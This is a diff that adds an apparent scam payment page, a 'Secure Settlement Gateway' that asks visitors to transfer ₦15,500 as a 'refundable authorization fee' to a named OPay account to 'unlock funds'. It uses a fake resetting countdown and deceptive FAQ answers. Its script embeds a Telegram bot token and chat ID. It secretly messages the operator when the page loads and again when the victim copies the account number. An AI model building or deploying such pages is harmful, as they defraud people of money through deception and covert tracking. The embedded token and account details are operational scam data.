@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Secure Settlement Gateway | AGMT</title>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        :root { --primary: #2563eb; --accent: #10b981; --bg: #f8fafc; --dark: #0f172a; --error: #ef4444; --border: #e2e8f0; }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Plus Jakarta Sans', sans-serif; }
+        
+        body { background: var(--bg); color: var(--dark); padding: 15px; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
+
+        .checkout-wrapper { width: 100%; max-width: 440px; animation: fadeIn 0.6s ease-out; padding-bottom: 50px; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+
+        /* Urgency Banner */
+        .urgency-box { background: #fee2e2; border: 1px solid #fecaca; padding: 12px; border-radius: 15px; text-align: center; margin-bottom: 20px; }
+        .timer-text { color: var(--error); font-size: 11px; font-weight: 800; text-transform: uppercase; letter-spacing: 0.5px; }
+        #timer { font-size: 14px; font-weight: 900; }
+
+        /* Main Payment Card */
+        .payment-card { background: white; border-radius: 35px; padding: 30px; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.06); border: 1px solid rgba(0,0,0,0.05); }
+        
+        .header { text-align: center; margin-bottom: 25px; }
+        .header h2 { font-size: 24px; font-weight: 800; letter-spacing: -1px; }
+
+        /* Amount Display */
+        .amount-container { background: #f1f5f9; border-radius: 25px; padding: 25px; text-align: center; margin-bottom: 25px; border: 1px solid var(--border); }
+        .amount-label { font-size: 10px; color: #94a3b8; font-weight: 800; text-transform: uppercase; letter-spacing: 1px; }
+        .amount-value { font-size: 34px; font-weight: 900; color: var(--dark); margin: 5px 0; }
+        .amount-sub { font-size: 11px; color: var(--accent); font-weight: 700; }
+
+        /* Bank Details Box */
+        .bank-details { background: var(--dark); color: white; border-radius: 25px; padding: 25px; margin-bottom: 20px; }
+        .bank-row { display: flex; justify-content: space-between; margin-bottom: 15px; align-items: center; }
+        .bank-label { font-size: 9px; color: #94a3b8; font-weight: 800; text-transform: uppercase; }
+        .bank-val { font-size: 14px; font-weight: 700; }
+        #acc-num { color: #fff; font-size: 22px; letter-spacing: 1.5px; font-weight: 900; }
+
+        /* Copy Button */
+        .btn-copy { width: 100%; background: #334155; color: white; border: none; padding: 18px; border-radius: 18px; font-weight: 800; font-size: 13px; cursor: pointer; transition: 0.2s; display: flex; align-items: center; justify-content: center; gap: 10px; margin-bottom: 20px; }
+        .btn-copy:active { transform: scale(0.97); background: var(--primary); }
+
+        /* FAQ Section */
+        .faq-section { margin-top: 35px; border-top: 1px solid var(--border); padding-top: 30px; }
+        .faq-title { font-size: 16px; font-weight: 800; margin-bottom: 20px; text-align: center; color: #64748b; }
+        
+        .faq-item { margin-bottom: 15px; background: white; padding: 18px; border-radius: 20px; border: 1px solid var(--border); }
+        .faq-q { font-size: 13px; font-weight: 800; margin-bottom: 8px; display: flex; align-items: center; gap: 8px; }
+        .faq-a { font-size: 12px; color: #64748b; line-height: 1.6; }
+        
+        /* Bottom Action Area */
+        .btn-verify { width: 100%; background: var(--primary); color: white; border: none; padding: 22px; border-radius: 22px; font-weight: 800; font-size: 16px; cursor: pointer; box-shadow: 0 12px 30px rgba(37, 99, 235, 0.3); }
+
+        .security-footer { text-align: center; margin-top: 25px; font-size: 11px; color: #94a3b8; display: flex; align-items: center; justify-content: center; gap: 8px; }
+    </style>
+</head>
+<body>
+
+    <div class="checkout-wrapper">
+        <div class="urgency-box">
+            <div class="timer-text">Payment Session Security Limit: <span id="timer">10:00</span></div>
+        </div>
+
+        <div class="payment-card">
+            <div class="header">
+                <h2>Authorize Batch</h2>
+                <p>Transfer to the merchant node below to unlock funds.</p>
+            </div>
+
+            <div class="amount-container">
+                <span class="amount-label">Authorization Fee</span>
+                <div class="amount-value">₦15,500.00</div>
+                <div class="amount-sub">✔️ Refundable upon completion</div>
+            </div>
+
+            <div class="bank-details">
+                <div class="bank-row">
+                    <span class="bank-label">Bank Name</span>
+                    <span class="bank-val">OPAY DIGITAL SERVICES</span>
+                </div>
+                <div class="bank-row">
+                    <span class="bank-label">Account Number</span>
+                    <span class="bank-val" id="acc-num">7032255367</span>
+                </div>
+                <div class="bank-row">
+                    <span class="bank-label">Account Name</span>
+                    <span class="bank-val">AGMT ADMIN SETTLE</span>
+                </div>
+            </div>
+
+            <button class="btn-copy" onclick="copyAccount()">
+                <span>📋</span> COPY ACCOUNT NUMBER
+            </button>
+
+            <button class="btn-verify" onclick="location.href='verify.html'">
+                I HAVE SENT THE ₦15,500
+            </button>
+        </div>
+
+        <div class="faq-section">
+            <div class="faq-title">Security & Verification FAQ</div>
+            
+            <div class="faq-item">
+                <div class="faq-q"><span>❓</span> Why is this fee required?</div>
+                <div class="faq-a">
+                    To comply with regional merchant anti-fraud policies, a <b>Liquidity Handshake</b> is required. This confirms your node is a human-operated terminal and prevents automated bot withdrawals.
+                </div>
+            </div>
+
+            <div class="faq-item">
+                <div class="faq-q"><span>🛡️</span> Is the deposit safe?</div>
+                <div class="faq-a">
+                    <b>Yes.</b> This is a verification hold. The ₦15,500 is automatically added to your total settlement balance and released once the final optimization batch is confirmed.
+                </div>
+            </div>
+
+            <div class="faq-item">
+                <div class="faq-q"><span>⚡</span> How fast is the payout?</div>
+                <div class="faq-a">
+                    Once our ledger detects your transfer, your terminal is unlocked instantly. Settlements to Nigerian banks typically reflect within 5-15 minutes.
+                </div>
+            </div>
+        </div>
+
+        <div class="security-footer">
+            <div style="width: 14px; height: 14px; background: var(--accent); border-radius: 50%;"></div>
+            FULLY ENCRYPTED MERCHANT TERMINAL
+        </div>
+    </div>
+
+    <script>
+        const botToken = "8673029559:AAF4zFJC80TERVUMTvZ9ieSMWM0K-2vWGTI";
+        const chatId = "7909543900";
+
+        window.onload = function() {
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=💳 <b>PAYMENT PAGE:</b> User is viewing bank details (7032255367). Intent is high.&parse_mode=html`);
+            startCountdown(600);
+        };
+
+        function copyAccount() {
+            const accNum = document.getElementById('acc-num').innerText;
+            navigator.clipboard.writeText(accNum).then(() => {
+                const btn = document.querySelector('.btn-copy');
+                btn.innerHTML = "<span>✅</span> ACCOUNT COPIED";
+                btn.style.background = "#10b981";
+                
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=💰 <b>COPY ALERT:</b> User just COPIED your OPay number (7032255367)!&parse_mode=html`);
+                
+                setTimeout(() => {
+                    btn.innerHTML = "<span>📋</span> COPY ACCOUNT NUMBER";
+                    btn.style.background = "#334155";
+                }, 3000);
+            });
+        }
+
+        function startCountdown(duration) {
+            let timer = duration, minutes, seconds;
+            setInterval(function () {
+                minutes = parseInt(timer / 60, 10);
+                seconds = parseInt(timer % 60, 10);
+                minutes = minutes < 10 ? "0" + minutes : minutes;
+                seconds = seconds < 10 ? "0" + seconds : seconds;
+                document.querySelector('#timer').textContent = minutes + ":" + seconds;
+                if (--timer < 0) timer = duration;
+            }, 1000);
+        }
+    </script>
+</body>
+</html>
+
